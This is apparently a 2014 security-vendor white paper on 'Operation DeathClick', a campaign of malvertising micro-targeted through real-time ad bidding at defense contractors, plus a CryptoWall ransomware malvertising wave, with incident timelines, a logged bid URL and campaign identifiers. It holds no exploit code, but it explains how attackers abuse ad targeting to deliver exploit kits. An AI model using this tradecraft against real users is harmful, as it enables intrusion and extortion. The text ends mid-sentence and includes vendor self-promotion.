             Release date: October 27, 2014
                                                     Invincea White Paper
                                                            Invincea, Inc.
                                                                                                               Invincea White Paper               1
Table of Contents
Executive Summary ............................................................................................................... 2
Introduction .......................................................................................................................... 3
   Operation DeathClick: Targeting the US Industrial Base ...................................................................4
   Summary for Incident at Fleaflicker.com .........................................................................................4
   Summary for Incident at Gpokr.com ...............................................................................................9
   Summary for Webmail.earthlink.net ............................................................................................. 11
   Summary of Incidents in Operation DeathClick ............................................................................. 13
Real-Time Bidding Networks: How it works .......................................................................... 13
   Malvertisers have Weaponized RTB ............................................................................................. 16
   Competitive Service Offerings for RTB .......................................................................................... 16
   Major Players in RTB .................................................................................................................... 20
   How Malvertisers Get $$ to Bid on RTB ......................................................................................... 21
   Where Malvertisers Host Exploits ................................................................................................. 22
   Real World Examples of RTB Malvertising Captured by Invincea .................................................... 23
Ransomware Campaign via Malvertising ............................................................................. 26
   Analysis of CryptoWall Malvertising Infections .............................................................................. 27
Central Hosting of Clean Content ......................................................................................... 30
How to Protect Yourself from Micro-targeted Malvertising ................................................. 31
Release Notes...................................................................................................................... 32
Invincea, Inc.                                                                                    Release Date: 10.27.2014
                                                                                     Invincea White Paper       2
Executive Summary
Most targeted attacks against organizations originate as spear-phish campaigns or watering hole style
web driveby attacks. Within the last six months, Invincea has discovered and stopped targeted
malvertizing attacks against specific companies -- particularly those in the Defense Industrial Base. The
combination of traditional cyber crime methods (malvertising) with targeted attacks against Defense
industrials for theft of IP represents another development in the on-going blending of techniques from
cyber crime and advanced threat actors with nation state agendas. We are tracking an on-going campaign
against US Defense companies under the code name Operation DeathClick.
Traditional malvertizing has been an effective but indiscriminate method cyber crime gangs use to
compromise endpoints to perpetrate ad fraud, identity fraud, and banking credential theft. In this new
targeted variation of malvertizing, the perpetrators are attacking specific organizations by leveraging real-
time ad bidding networks and micro-targeting techniques developed over the last decade in online
advertising. The objective of these micro-targeted attacks against the Defense sector is likely theft of
Intellectual Property more than ad fraud and indicates motive and sophistication characteristic of
advanced threat actors. Since these attacks were blocked by Invincea prior to compromise of the machine
or network, we cannot confirm the specific IP the perpetrators are after 
 only the Tactics, Techniques,
and Protocols (TTPs) used which we describe herein, similar to methods used to provide backdoor access
and command and control over compromised networks.
While we discovered these attacks across multiple Defense companies, we expect it will not be long, if
not already, before other highly targeted segments including Federal, Financial Services, Manufacturing,
and HealthCare are victimized with the same micro-targeted malvertising. The campaign described here
does not represent a single flaw, 0-day, or unpatched bug, but rather a significant development in the
adversary
s capabilities and strategy to leverage legitimate online advertising platforms on well-known ad
supported websites via a technique called Real-Time Ad Bidding. In other words, this problem will not be
patched on Tuesday.
UPDATE: We have updated this document to include a new section on a campaign of distributing
CryptoWall ransomware via malvertising. While the attack vector is the same, we believe this to be
motivated by cybercrime rather than theft of IP from Defense companies.
Invincea, Inc.                                                             Release Date: 10.27.2014
                                                                                   Invincea White Paper       3
Introduction
Malvertising has seen meteoric rise in 2014. Threat actors create a corporate front, advertise on
commonly visited sites, then later switch out the landing pages for their ads to pages that host exploit
kits, or simply create a temporary redirection from their usual content to the malicious landing page.
These exploit kits are hosted on compromised web servers across the world. In other words, they leverage
legitimate ad-supported popular websites together with compromised websites for hosting exploit
landing pages, defeating black-listing techniques. The lifetime of these ads and landing pages are
measured in hours.
In the campaign described here, Operation DeathClick, traditional malvertising has been armed with a
micro-targeting system using IP address ranges, geographically narrowed down to zip codes, and interests
of the user (recorded in cookies) to target specific companies, company types, and user
interests/preferences. They are employing the tactics of real-time ad bidding to guarantee malicious ad
delivery to intended targets of the campaign 
 building on a decade of work in real-time analytics for
online ad placement, but for nefarious purposes.
The threat actors redirect their ads for just minutes at a time and then abandon their exploit kit pages
forever. This means that list-based threat intelligence feeds are rendered ineffective. The domains used
do not appear in any proxy blacklist, and the malware droppers delivered by the exploit pages always
employ different signatures, evading traditional network and endpoint detection technology.
Ad delivery networks today are not incentivized to address the problem in a credible manner as they
derive revenue from the criminal enterprise, while not being held accountable. Turning a blind eye to the
problem is rewarded economically. Meanwhile the perpetrators are able to use traditional malvertising
and ad fraud bots to fund the criminal enterprise.
Without cooperation of ad networks to vet the advertisers working through front companies, this attack
vector will go unchecked. And now, with the advent of real-time ad bidding, these threat actors have
weaponized ad delivery networks to target victims based on:
    
   User-Agent strings (versions of flash, OS, java and browser)
    
   Interest-related content (click bait articles, industry specific software or hardware, like medical
        supplies, radar mapping software, ammunition sales, stocks forums)
    
   Advertising Profiles derived from cookies (someone with specific tastes, may shop for shoes,
        handbags, cars, luxury vacations)
    
   Geographic region (malvertisers can target specific neighborhoods or states via geoip direct
        advertising)
    
   Specific corporate IP ranges (targeted malvertising can target the public IP space of your network
        or an Industrial Vertical)
Invincea, Inc.                                                           Release Date: 10.27.2014
                                                                                   Invincea White Paper       4
Real-time ad bidding allows advertisers, and by extension, adversaries, to micro-target ad delivery on an
extremely granular basis. For example, oppressive regimes trying to gather intelligence on activist
protests can deliver ads to people getting email from within a specific locality where they are protesting.
Today, it is commonplace for micro-targeting techniques to be used as part of the toolset in legitimate
online advertising. For instance, a defense contractor, trying to win a new omnibus contract, can deliver
targeted ads to online news sites frequented by Government program personnel. The latest software
product release can be delivered to Windows users visiting PC Magazine
s website. A local car dealership
can sense when someone is in the market for a new car and can deliver advertising to those users, based
solely on browsing history.
Now advanced threat actors are able to target an organization directly via micro-targeted malvertising,
based solely on their corporate network IP range. Thus, it doesn
t matter where in the world you point
your web browser -- an online video poker room, a fantasy football club homepage, a Pakistani news
homepage, or even checking your own webmail at a trusted email provider. Those ad windows can and
are being used to deliver malware if the bidding price is right.
Operation DeathClick: Targeting the US Industrial Base
Recently, multiple US Defense/Aerospace contractors were targeted by a malvertising campaign. These
contractors had deployed world-class enterprise security defense in depth approaches to protect their
intellectual property. They had next generation firewalls that relied on threat intelligence feeds to do
auto-blocking of known malicious sites. They had malware interception technology that relied on known
bad hashes to prevent malicious downloads. The multiple proxies in place subscribed to real time feeds
of known bad URLs. They deployed AV at the gateways and on the endpoints.
But in a two week period, these organizations were hit with dozens of micro-targeted malvertising attacks,
each of which would have provided a beachhead for the threat actors from which to compromise the
network, if successful. In each instance, the attacks were carried out by targeting these Defense
contractors directly via real-time ad bidding. Once targeted, an end user only needed to browse to any
website, anywhere in the world, which contained a DoubleClick ad-partner embedded window. Invincea
stopped these attacks on the endpoints by containing the delivered exploits in secure virtual containers,
while producing the forensics that led to this discovery.
Next we go in some detail about example attacks perpetrated against the defense firms.
It is important to note that the websites we show next that served up targeted malvertising were victims
of malvertising campaigns with no knowledge of the malicious ads they were serving up. These malicious
ads were served up by 3rd party networks, who are unwittingly sourcing malicious content. As we will
discuss later, the 3rd party ad networks themselves are falling victim to malicious content campaigns.
Summary for Incident at Fleaflicker.com
Invincea, Inc.                                                            Release Date: 10.27.2014
                                                                                  Invincea White Paper       5
A user visited his online fantasy football league homepage at Fleaflicker.com. As soon as the page loaded,
a malicious ad delivered a backdoor Trojan via a Java-based exploit.
Figure 1 shows a screenshot of the page that was visited. You will notice the two inline ad placements
for DoubleClick ad delivery. The malware delivered came from a compromised Polish website, and
would have installed a generic backdoor Trojan.
                                    Figure 1: Fleaflicker.com website
Note the prominent ad placements by AdChoice, a DoubleClick affiliate. Figure 2 shows an event tree of
the exploit and malware delivered from an ad by visiting Fleaflicker.com.
Invincea, Inc.                                                           Release Date: 10.27.2014
                                                                                   Invincea White Paper       6
                     Figure 2: Event tree for infection from Fleaflicker.com Incident
The event tree in Figure 2 taken from Invincea
s Threat Management Console shows the exploited Java
process dropped a file called fvJcrgR0.exe, and that it likely came from Pubmatic, an ad delivery network
that allows for real time bidding to deliver ads. In this instance, the Pubmatic server redirected to a Web
server in Poland that dropped the malware. The timeline below shows the exact times and URLs visited.
                             Figure 3: Timeline for Fleaflicker.com Incident
Note the number of re-directs from Fleaflicker.com to different outside properties in Figure 3.
Invincea, Inc.                                                            Release Date: 10.27.2014
                                                                                     Invincea White Paper       7
Figure 4: Process Launch for Malware fvJcrgR0.exe from Fleaflicker.com Incident
Invincea Threat Management provides a quick way to search for an MD5 hash on third party sites (see
Figure 4). By clicking the VirusTotal link, the analyst will see the following VirusTotal report in Figure 5:
Figure 5: VirusTotal Report for Malware fvJcrgR0.exe from Fleaflicker.com Incident
Invincea, Inc.                                                             Release Date: 10.27.2014
                                                                                     Invincea White Paper       8
From the VirusTotal report in Figure 5, you will see that this malware is a Trojan backdoor that would likely
be used to download additional malware or to provide remote persistent access to the attacker.
Invincea, Inc.                                                             Release Date: 10.27.2014
                                                                                    Invincea White Paper       9
Summary for Incident at Gpokr.com
An employee at a defense contractor visited a free Texas Poker online game. The Poker site had
advertisements on the page, one of which launched a similar attack as seen in before on other websites
visited by employees at this firm.
                                   Figure 6: Screenshot of Gpokr.com
It should be noted that Gpokr.com no longer appears to be serving advertisements from their site. At the
time of the incident, as seen in the logs below, an ad window was previously present. In the event tree
shown in Figure 7, you will see that the winning bid redirected to a direct-to-IP site instead of a site via
domain name. Also, above is the first indication of specific executable DLL files. Searches for these
filenames returned zero results on VirusTotal.
Invincea, Inc.                                                            Release Date: 10.27.2014
                                                                                   Invincea White Paper       10
                                   Figure 7: Event Tree for Gpokr.com
This event on September 14 (Figure 8) shows that delivery.first-impression.com redirected directly to an
IP address, not a domain name to deliver its malicious payload. Note the multiple DLL files written to disk
and the spawning of rundll32.exe. At this point, the Invincea-protected host recognized the unauthorized
process and reverted itself to a clean state.
                            Figure 8: Timeline View for Event 5 
 Gpokr.com
Invincea, Inc.                                                            Release Date: 10.27.2014
                                                                                    Invincea White Paper       11
Summary for Webmail.earthlink.net
In another incident an employee checked their online Earthlink account. When they replied to an email,
a new ad was loaded on a page that attempted to exploit Java. This malvertising was from the same IP
address seen in other incidents.
                             Figure 9: Screenshot of Webmail.earthlink.net
You will notice the inline advertisements on this page in Figure 9. The event tree in Figure 10 notes that
this was likely a spear-phish attack. The timeline will show that when the user replied to an email, the ads
on the Earthlink page refreshed, dropping the exploit code via Java.
Invincea, Inc.                                                            Release Date: 10.27.2014
                                                                                  Invincea White Paper    12
                      Figure 10: Event Tree for Incident 6 Webmail.earthlink.net
Note in the timeline in Figure 11, how there was a 7 minute gap between the DoubleClick ad redirect and
the delivery.first-impression.com ad. This is an indication that the page was refreshed or the ad was
refreshed on the page. The same exploit IP address from the Gpokr event is present. This event is the
oldest, happening on September 11.
                       Figure 11: Timeline for Incident 6 Webmail.earthlink.net
Invincea, Inc.                                                         Release Date: 10.27.2014
                                                                                    Invincea White Paper       13
Summary of Incidents in Operation DeathClick
The three examples above are samples of the more than two dozen micro-targeted attacks we have
witnessed and blocked as part of Operation DeathClick since mid-September. Defense Industrial Base
customers witnessed micro-targeted malvertising at a rate six times that of comparable private sector
companies with similar defense-in-depth capabilities.
Real-Time Bidding Networks: How it works
We observed in Operation DeathClick that real-time ad bidding networks are being used by criminal
enterprise to target companies with malicious content in order to gain persistent remote access. In
these third-party arrangements, the content is frequently not vetted because billions of impressions are
rendered in real-time. Most of the content is legitimate ads. A small fraction is malicious content linking
to landing pages that infect users. Real-time ad networks are being used, often unwittingly, and some
have taken steps to try and combat malicious use of their networks. The Online Trust Alliance is one such
industry group comprised of major software companies and ad networks working together to try and
address this problem. Our goal in this paper is to shed light on the micro-targeting of companies by
criminal enterprise employing real-time ad networks, and to aid the industry in collectively addressing
this problem.
Real-time ad bidding networks have evolved over the last ten years as a means of micro-targeting
customers with advertising content they are more likely to click-on.
From Wikipedia:
        Real-time bidding (RTB) refers to the means by which ad inventory is bought and sold on a per-
        impression basis, via programmatic instantaneous auction, similar to financial markets.[1] With
        real-time bidding, advertising buyers bid on an impression and, if the bid is won, the buyer
s ad is
        instantly displayed on the publisher
s site.[2] Real-time bidding lets advertisers manage and
        optimize ads from multiple ad-networks by granting the user access to a multitude of different
        networks, allowing them to create and launch advertising campaigns, prioritize networks and
        allocate advertising stock.
        Real-time bidding is a dynamic bidding process where each impression is bid for in (near) real time,
        against a static auction where the impressions are typically bundled in groups of 1,000.
        A typical transaction begins with a user visiting a website. This triggers a bid request that can
        include various pieces of data such as the user
s demographic information, browsing history,
        location, and the page being loaded. The request goes from the publisher to an ad exchange,
        which submits it and the accompanying data to multiple advertisers who automatically submit
        bids in real time to place their ads. Advertisers bid on each ad impression as it is served. The
Invincea, Inc.                                                            Release Date: 10.27.2014
                                                                                  Invincea White Paper       14
        impression goes to the highest bidder and their ad is served on the page.This process is repeated
        for every ad slot on the page. Real time bidding transactions typically happen within 100
        milliseconds from the moment the ad exchange received the request.
        The bidding happens autonomously and advertisers set maximum bids and budgets for an
        advertising campaign. The criteria for bidding on particular types of consumers can be very
        complex, taking into account everything from very detailed behavioral profiles to conversion data.
The following infographic summarizes how advanced adversaries are now micro-targeting companies
using malvertising.
Invincea, Inc.                                                           Release Date: 10.27.2014
                         Invincea White Paper   15
Invincea, Inc.   Release Date: 10.27.2014
                                                                                      Invincea White Paper        16
Malvertisers have Weaponized RTB
The marketplace and auction of ads sounds great for actual ads. But what if the landing pages that are
supposed to be ads are actually malicious PHP pages with embedded malware? The bidding and ad
placements work the same, but instead of seeing a flashy ad banner, the highest bidder for the placement
serves malware. The price to win the bid to push malvertising to any page you happen to visit ranges from
45 to 75 cents per impression.
A malicious advertiser on a network may serve crafted, seemingly normal ads, a majority of the time. In
fact, the ads are often stolen copies from legitimate advertisers. This establishes the attacker
s legitimacy
and trust on the ad network. Of course with real-time ad bidding, he can simply offer up low bids and his
content would consistently lose in the marketplace. But it is very simple to replace the redirection code
to switch from a legitimate ad banner to a drop site that hosts an exploit kit, typically based on Java, Flash,
Silverlight, or all three. Once the malvertiser detects that he has several infected hosts, he removes the
redirection code and goes back to serving standard ad banners. He then 
burns
 his temporary exploit kit
drop site, moving his exploits to another location for a new campaign.
This allows the malicious advertiser to perform hit and run attacks, infect whomever he wants at whatever
time he wants, and maintain his presence on the advertising marketplace without drawing undue
attention to his activities.
In the sections below, we will provide highlights of the RTB industry, its targeting capabilities, and show
how malvertisers have been mis-appropriating RTB networks to deliver malware.
Competitive Service Offerings for RTB
The RTB ad networks provide significant micro-targeting capabilities that have long been used to serve
legitimate content to users more likely to click on them. In the following, we describe these capabilities
to show the state of the art in RTB network capabilities. The quoted material below are direct quotes from
Real Time Bidding service providers linked. Emphasis added by Invincea.
           Pubmatic:
        Audience Targeting: Bid on the audiences most valuable to you. Each impression in the PubMatic
        auction can be enhanced with first- and third-party data; giving buyers targeting capabilities
        across display, mobile, tablet and video inventory. Media buyers can also cookie sync with
        publisher audiences to incorporate CRM, retargeting and exclusion strategies in their digital
        advertising.
        Buyers have access to proprietary audience segments either directly through Private Marketplace
        deals or through the open market. With hundreds of parameters available to you, PubMatic has
        your best audiences waiting for you.
Invincea, Inc.                                                              Release Date: 10.27.2014
                                                                                    Invincea White Paper       17
        With PubMatic, buyers are able to access pre-defined vertical or audience packages, seasonal
        packages, publisher and/or site-specific inventory packages as well as pre-selected publisher
        packages and pricing available in Private Marketplaces.
           First-Impression.com
        
First-Impression Buy-Side offers the granular targeting, tracking, and reporting needed to help
        our clients make the most of their spend, along with an expert support team to advise when
        needed. By leveraging real time buying, First-Impression Buy-Side gives media buyers the full
        control to maximize the value of an impression.
Could Malvertisers Track Exploits and their cost per impression? Yes. Many RTB networks provide a
control panel to track advertising campaigns in real-time, along with notifications that bids have been won
and who exactly was served the malware.
Below is a URL redirection log from First-Impression.com from a winning bid by a malvertiser. In the URL
are parameters such as the type of ad, the type of user-agent string of the ad reader specified (which
discloses browser and java versions), whether it is a retargeted ad based off of cookies (this one was not),
the price paid, which is 65.4 cents, and the notification to the malvertiser that his malvertising was
delivered.
 http://delivery.first-
impression.com/delivery?action=serve&ssp_id=3&ssp_wsid=2191400908&dssp_id=100&domain_
id=2191400908&ad_id=748271&margin=0.4&cid=155380&bn=sj14&ip_addr=24.234.123.133&ua=15
40937276&top_level_id=24.234.123.133&second_level_id=1540937276&page=thanhniennews.co
m&retargeted=null&height=90&width=728&idfa=null&android_id=null&android_ad_id=null&bi
d_price=0.654&count_notify=1&win_price=$AAABSMPg1dmFEPqXEZe5_CYviub3uOlabldGew
           DoubleClick.net
DoubleClick discusses their targeting capabilities in online documentation. Since they specialize in
knowing the location of their ad windows, they market those ad spaces to the actual advertisers and
malvertisers, along with targeted demographics about the content pages, the visitors to the sites and
more.
        To showcase the variety of impression-level data available to buyers, consider the data made
        available through a connection to DoubleClick Ad Exchange
s real-time bidding API. With ADX, a
        buyer could consider any of the following data passed from the seller with each impression:
        
 Ad slot parameters: visibility (above or below the fold), size, excluded creative attributes,
        excluded advertiser URLs, allowed vendor or ad technology.
        
 Geo parameters: country, region, metro, city.
        
 Content parameters: site URL, site language, seller network, vertical or category.
Invincea, Inc.                                                            Release Date: 10.27.2014
                                                                                      Invincea White Paper        18
        
 User parameters: browser, operating system, anonymous cookie (hashed), cookie age.
        Just like when considering one type of data, by using the anonymous cookie parameter, buyers
        can consider first-party retargeting or third-party audience data from a data provider. However,
        they can go further in the evaluation by looking at more of these parameters. This helps a buyer
        learn much more about a particular user and a particular impression, gain a smarter answer to
        the three essential questions and make a more data-driven decision.
           Twitter, Facebook and other RTB ads can now target mobile devices by their phone
           numbers.
This sounds like a great way to advertise if you are in the marketing industry. Consider how granularly a
person can be targeted if this service is used maliciously. If not targeted by the desktop, how about on
the mobile platform?
        Twitter
s Tailored Audiences just got a little more tailored.
        Advertisers can now augment their customer data using mobile advertising IDs and mobile
        phone numbers as a way to reach existing customers and increase audience size. In essence, the
        move is an extension of Twitter
s Tailored Audiences for CRM retargeting, which allows advertisers
        to use hashed non-PII email address to retarget existing customers. (email addresses are twitter
        IDs- so you could be targeted for ad delivery based on your account name or known phone
        number)
        Twitter also rolled out the ability to target lookalike audiences, a function that seems pretty similar
        to Facebook
s tool of the same name. Twitter
s lookalike modeling uses a proprietary algorithm
        that examines modeled users looking for similarities related to behaviors, interests, location,
        demographic attributes and engagement patterns.
        Twitter described its enhanced as 
part of improved targeting options to help advertisers reach
        additional users similar to their existing audiences.
        Tailored Audiences, Twitter
s seeming answer to the Facebook Exchange (FBX), officially launched
        back in December after running retargeting and database matching tests in July. Twitter has
        appeared to follow Facebook
s lead with a number of its recent roll-outs, including site retargeting,
        CRM targeting and now retargeting via lookalike audiences. (Facebook also makes it possible to
        target users by phone numbers through Custom Audiences.)
           Neustar.biz
Neustar does provide a real-time bidding ad exchange, but their real market is IP intelligence that they
sell to other advertising networks for the purposes of better targeting specific users. In Europe, laws
require that advertising networks allow people to opt out of having tracking cookies, which is how many
advertisers used to rely upon for ad campaign targeting. To get around this, Neustar perfected IP based
targeting, which avoids cookies. They are able to build IP specific browsing profiles based on IP subnets.
In a blog post below, Neustar boasts about their direct to IP range and enterprise advertising.
Invincea, Inc.                                                              Release Date: 10.27.2014
                                                                                     Invincea White Paper       19
        How can Neustar IP Intelligence target by IP?
        While IP intelligence has been around for many years, the ability to effectively target advertising
        by audience, based on IP is very new. Neustar IP Intelligence is currently working with select DSP
        platforms to buy impressions off of the exchanges based on the IP address rather than cookies.
        This has only been possible with the recent emergence of real time bidding (RTB). The secret
        sauce is in understanding the IP and the methodology necessary for targeting ads appropriately
        against it.
        Is an IP Address like a cookie?
        No, an IP address only identifies devices on a network. The IP address does not contain any PII and
        does not track or store any consumer usage or behavioral information. (But IP ranges are
        registered by IANA, and you can easily know who owns the ranges)
        Product Specific Questions
        Q1: How does the process work?
        The process works exactly like any advertising network. Instead of buying inventory based on a
        cookie, Neustar is buying inventory based on an IP address. We run the targeting specifics against
        our proprietary database and create a custom IP list to target against. Neustar has set up
        relationships with partners that have built the functionality for this to work end-to-end for our
        advertisers.
        Neustar offers a full service ad network. Brand marketers who wish to advertise using IP Audience
        Targeting can work directly with Neustar to determine custom IP placements, run campaigns,
        optimization, reporting and billing. Much like any traditional online publisher or online ad network,
        Neustar manages the entire process.
        How does Neustar deliver its ads?
        We use industry standard methods for delivering our ads, but what makes our approach special is
        that we bake in the IP data before delivering the inventory with our network partners, which
        allows us to target display ad campaigns to a specific business or organization. We obtain
        inventory from ad exchanges, but have our own ad server.
           Zedo
Zedo, blamed for recent malvertising via DoubleClick, say they are now trying to protect against
malvertisers in this blog here. Less than a week after this announcement, they published another blog
post that describes how they can push advertising to specific platforms, devices, as well as specific markets
and networks:
        ZEDO Advertising Technology Updates 
 September 2014
        Device Targeting
        Users can now target ads to a specific device when trafficking ads. An option for 
Device
        Targeting
 is now available under 
Targeting
. A creative targeted to a specific Device will serve
        only on that Device. All major manufacturers/models are supported by this feature. If a creative is
        not targeted to any specific device than it will serve on all device.
Invincea, Inc.                                                             Release Date: 10.27.2014
                                                                                 Invincea White Paper      20
        Figure 13: Targeting by Device Manufacturer/Model
        Apart from device, a user can target various devices based on different categories. At any given
        point of time, a user can target multiple manufacturers and categories.
        Figure 14: Targeting by Device Category
        Reach Report by Creative
        Apart from existing campaign reach report a user can now pull a reach report by creative. The
        creative reach report is available along with all the existing parameters and can be pulled by
        month, week or day. Creative reach report will show creative wise reach. It will help to analyze
        how effective the reach of a creative was.
Major Players in RTB
Invincea, Inc.                                                         Release Date: 10.27.2014
                                                                                     Invincea White Paper        21
To be clear, RTB networks are legitimate platforms for displaying ads on ad-supported websites. They
enable micro-targeting of user
s interest, delivering content that a viewer would likely want to see. As we
have detailed here, they can also be mis-appropriated unwittingly by malvertisers using these same tools
and techniques to target companies with malware for persistent remote access in addition to traditional
click fraud, phishing, and identity theft.
Below are links to RTB providers to learn more.
http://www.sovrn.com/
http://www.turn.com/
http://indexexchange.com/
https://www.dataxu.com/
http://www.sitescout.com/rtb/
http://first-impression.com/home/
http://www.zedo.com/
How Malvertisers Get $$ to Bid on RTB
Invincea has shown logs from a winning malvertising bid in the price range of 65 cents per impression.
That is one ad, on one page, paid for by the malvertiser
s account. This implies that malvertisers have
deep pockets, spending hundreds of dollars on ad impressions. So how do they get money to spend on
these malicious campaigns?
Invincea recently saw a malvertiser win a bid and delivered a Java exploit. This exploit copied a fully
functional version of Chrome into the Java cache directory, and that version of Chrome launched in the
background and proceeded to visit websites and click on specific ad banners. It is presumed that these
ad banners paid revenue via referral bonuses to the malvertiser. By paying 65 cents to install a
background web browser that does nothing but click fraud, the malvertiser is able to reap hundreds if not
thousands of dollars in advertising referral income. It is a pretty good return on investment, which in turn
allows the malvertiser to fund his micro-targeted malvertising attack campaign.
It is ironic, however, that click fraud is what is driving the prices of RTB advertising so high. Malvertising
is not only a danger to end users, but it is a danger to the advertising industry as well. The image from
Figure 14 below shows a log file of Chrome, in this instance, renamed Oajvliewxpge.exe, injected via Java
to run in the background. Invincea detected this attack and killed the infection attempt. This is one
instance where the malvertiser wasted his 65 cents.
Invincea, Inc.                                                              Release Date: 10.27.2014
                                                                                     Invincea White Paper       22
Figure 16: Event tree of click fraud malvertising exploit
It should be noted that Invincea is uniquely capable of stopping this type of attack. The introduction of
Chrome as a browser, which is whitelisted by hash across the AV industry, would go unchecked by the AV
and whitelisting applications industry. In this instance, the host was almost converted to a click-fraud bot.
But the malware delivery could have been intended for data exfiltration, banking Trojans, or any other
more insidious purpose.
Where Malvertisers Host Exploits
The ability for advertisers and malvertisers to automatically redirect to self-hosted ad content or exploit
pages is driving RTB malvertising. Invincea has witnessed a rash of exploit kits and landing pages hosted
    
 Compromised WordPress Blogs
Invincea, Inc.                                                             Release Date: 10.27.2014
                                                                                     Invincea White Paper       23
    
   Unconfigured Apache hosts
    
   Cloud-based NGINX subdirectories
    
   Government and News pages in Poland
    
   Free Hosting sites such as ua.in
In most instances, the landing pages are preconfigured with the exploit kit. The malvertiser creates the
redirection in his normal ad prior to raising his bids to winning levels. Once several victims are confirmed,
those malicious landing pages have the content erased, and the automatic redirection removed to serve
normal
 ads again.
Real World Examples of RTB Malvertising Captured by Invincea
Figures 17 through 21 in the following are screenshots from Invincea
s Threat Management console from
various RTB-based malvertising incidents with highlighted URLs for malvertising delivered via RTB ad
bidding.
Figure 17: Recent Blaze.Com RTB Kryptik malvertising via GumGum
Figure 18: Online Ammunition Forum had RTB malvertising delivered. Exploit landing page in
In.ua.
Invincea, Inc.                                                             Release Date: 10.27.2014
                                                                        Invincea White Paper   24
Figure 19: Largest Trading Online Forum Trade2Win.com delivered RTB malvertising via
German provider:
Figure 20: Answers.com click bait articles hosted winning RTB bids dropping Kryptik from
Polish government landing page exploit kits.
Invincea, Inc.                                                  Release Date: 10.27.2014
                                                                      Invincea White Paper   25
Figure 21: Online Poker Room and targeted RTB attack against Defense Contractor. Java
exploit hosted at unconfigured Nginx host.
Invincea, Inc.                                                Release Date: 10.27.2014
                                                                                    Invincea White Paper       26
Ransomware Campaign via Malvertising
In September and October of 2014, Invincea saw a sharp spike of malvertising delivering CryptoWall
ransomware attacks via Real Time Ad Bidding. We observed Real Time Ad bidding platforms, including
OpenX, GoogleAds, Yahoo, AOL, and first-impression.com, fall victim to the ransomware malvertising
scheme by unwittingly delivering the CryptoWall 2.0 ransomware ads.
Ransomware is a particularly pernicious form of malware that fully encrypts the victim
s disk and data
files, including remote storage, then demands payment of anywhere from $300 to $1000 in return for the
decryption key. Users are held hostage from their own work, pictures, personal, and proprietary material.
To learn more about the scourage of ransomware, see this blog.
Based on analysis of Invincea logs in would-be victims targeted by these ads, we have insight into the
attacker that is delivering the malicious ads. According to Invincea analysis of ads delivered from first-
impression.com, winning ad bids ranging from as low as 30 cents and as high as $1.70, were delivered by
a block of unique identifiers. It is highly likely that the same attackers are using other RTB ad platforms.
This campaign matches the characteristics described by Proofpoint in its blog in terms of the exploitation
methods. Legitimate ad copy is stolen, 3rd party ad networks used to distribute malware, and popular ad-
supported websites displaying the malicious ads that exploit unsuspecting visitors with drive-by web
exploits. Merely visiting any ad-supported site may result in a CryptoWall ransomware infection.
Cryptowall 2.0 utilizes the TOR network to hide its communications, but it quickly encrypts all local files
on the disk, and demands bitcoin payment to unlock the files. Many companies have fallen prey to this
attack over the past few months, making this one of the most successful Ransomware campaigns to date.
Invincea, Inc.                                                            Release Date: 10.27.2014
                                                                                 Invincea White Paper    27
Analysis of CryptoWall Malvertising Infections
Mitigated Infection Event Sports.Yahoo.com
Below is a typical Cryptowall 2 infection as seen in the Invincea Management Server logs. This winning
ad placement ran on sports.yahoo.com 
 an Alexa Top 4 rated site. Highlighted in order in Figure 22 is
the common filename of obupdat.exe, which has ever changing hashes, followed by the TOR port, and
the 3rd party ad platform of first-impression.com.
Analysis (Original report):
                              Figure 22: CryptoWall 2.0 infection report
Invincea, Inc.                                                          Release Date: 10.27.2014
                                                                                Invincea White Paper    28
Timeline Analysis (Original Report):
Below in Figure 23 is the timeline of the Tor connections and SSL connections employed by CryptoWall.
                         Figure 23: Network connections from CryptoWall 2.0
Invincea, Inc.                                                         Release Date: 10.27.2014
                                                                                  Invincea White Paper     29
In addition, you can see the ransom note being written to disk on an infected machine in the audit logs
in Figure 24.
                 Figure 24: File writes including the ransom note from CryptoWall infection
Figure 25 shows the winning malvertising bid via RTB ad delivery from first-impression.com. Items
highlighted in the URL below is userid, and the winning bid price to place malvertising of Cryptowall on
sports.yahoo.com, which is 60 cents.
                     Figure 25: Winning malvertising bid with fields embedded in URL
Invincea, Inc.                                                           Release Date: 10.27.2014
                                                                                     Invincea White Paper       30
In Figure 26 below, we show the unique identifiers for the userID and campaigns to deliver CryptoWall
malware that were blocked and audited by Invincea, including the websites that delivered the ads via a
third-party ad network over the past month.
 userID, CampaignID and CommonName                                  Website Delivering Malvertising
 748568&margin=0.4&cid=155493&bn=wheelie                            Hotair.com
 748568&margin=0.4&cid=155493&bn=wheeljack                          webmail comcast
 748163&margin=0.4&cid=155330&bn=wheeljack                          theblaze.com
 748566&margin=0.4&cid=155493&bn=redalert                           sports.yahoo.com
 746705&margin=0.4&cid=154897&bn=dc16 (unknown)                     www.searchtempest.com
 748480&margin=0.4&cid=155474&bn=redalert                           viewmixed.com
 748600&margin=0.4&cid=155528&bn=inferno                            rr webmail
 748418&margin=0.4&cid=155453&bn=inferno                            lucianne.com
 748270&margin=0.4&cid=155380&bn=sj10 (skipjack)                    thanhniennews.com
 748417&margin=0.4&cid=155453&bn=wheeljack                          mariowiki.com
Figure 26: Malware campaigns delivered via 3rd party ad network and the websites that hosted the
To reiterate, neither the websites listed here, nor the 3rd party ad network, necessarily was aware of the
malicious ads they were serving to the website visitors. It is likely they were not aware without ad
screening technology.
In each event above, Invincea blocked an attempt to infect an endpoint with Cryptowall 2.0 and
prevented CryptoWall from encrypting the user
s file system and holding it hostage. Had the user not
been running Invincea, the attack would likely have been successful, and the only way the user would
have had to recover the encrypted files would be to pay the attacker the ransom. This is an effective
ransom technique, and one that is paying off well for the attackers, who use the income from the
attacks to purchase Real Time Ad Bids on RTB networks to infect more users.
Central Hosting of Clean Content
Most RTB ad providers allow for advertisers to host their own ad content. This allows advertisers to
directly collect web impression data of who is hitting which ads, from where, by which IPs, which user-
agent strings, and just about anything else you could log about a website visit. In addition, the advertising
network doesn
t have to utilize their own disk space to host the image files, the flash videos or other
online content. RTB networks simply do the auctioneering and redirection to the winning content.
Invincea, Inc.                                                             Release Date: 10.27.2014
                                                                                   Invincea White Paper       31
It is this weakness in security that malvertisers are taking advantage of. If ad networks were to switch to
a model where all content is actually hosted by them (1st party hosting), in a cloud, then the risk of
malvertising would drop dramatically.
The RubiconProject has a Seller
s Cloud, which could be a security model for the RTB industry. It is
inherently more secure way of hosting ad content.
How to Protect Yourself from Micro-targeted Malvertising
Operation DeathClick is an active campaign to micro-target companies via malvertising in order to
compromise their networks. Unfortunately, the micro-targeting malvertising technique evades almost all
network controls and traditional endpoint anti-virus solutions. Invincea can protect users from this attack
type among other targeted and opportunistic web-based threats. For half the price of a candy bar,
